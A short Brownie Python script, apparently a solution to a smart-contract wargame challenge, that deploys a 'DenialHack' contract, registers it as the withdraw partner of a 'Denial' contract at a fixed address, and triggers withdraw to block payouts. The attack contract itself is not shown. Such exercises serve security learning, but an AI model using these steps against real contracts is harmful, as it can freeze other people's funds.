from brownie import Denial, DenialHack, accounts, Contract

INSTANCE_ADDRESS = "0x6DF03525c50968fD073002e90c9A3BD5328Aa8d2"
ACCOUNT = "straul"

def get_account():
    # account = accounts[0]  # local testing
    account = accounts.load(ACCOUNT)
    return account


def denial(account):
    denial = Contract.from_abi(name="denial", address=INSTANCE_ADDRESS,
                               abi=Denial.abi)
    # denial = Denial.deploy({'from': account})  # local testing

    denial_hack = DenialHack.deploy({'from': account})

    # set partner
    denial.setWithdrawPartner(denial_hack.address, {'from': account})

    # call withdraw
    denial.withdraw({'from': account})


def main():
    account = get_account()
    denial(account)